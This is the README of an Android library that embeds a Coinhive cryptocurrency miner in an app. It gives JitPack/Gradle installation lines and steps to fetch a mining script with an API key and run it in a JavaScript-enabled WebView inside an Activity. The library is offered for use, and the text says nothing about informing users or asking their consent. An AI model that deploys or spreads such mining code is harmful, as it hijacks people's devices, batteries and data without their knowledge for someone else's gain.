# coin-miner-android-library
Library that you can use it for gain the coin by inject it into you app 
1-instalation
	
  allprojects {
		repositories {
			...
			maven { url 'https://jitpack.io' }
		}
	}
  
  
  	dependencies {
	        compile 'com.github.alitarfa:coin-miner-android-library:0.0.1'
    	}
      
      
      
  2- how yo use the library :
  
        - you must have key Api for insert it from the site :coinhive 
        - in the library there is method named getFileSetting(key_api);
          this method return String file you must save it into attr string  
          
      - you must insert WebView in the Activity with width and height wrap-content
      - in Activity java 
           WebView wv=findViewById(R.id.webView);
           wv.getSettings().setJavaScriptEnabled(true); 
           
            String mime = "text/html";
            String encoding = "utf-8";
            Log.e("script",file);
            webView.loadDataWithBaseURL(null, file, mime, encoding, null);
            the file param is the String returned by static method getFileSetting() from the class SettingFileCoinMiner

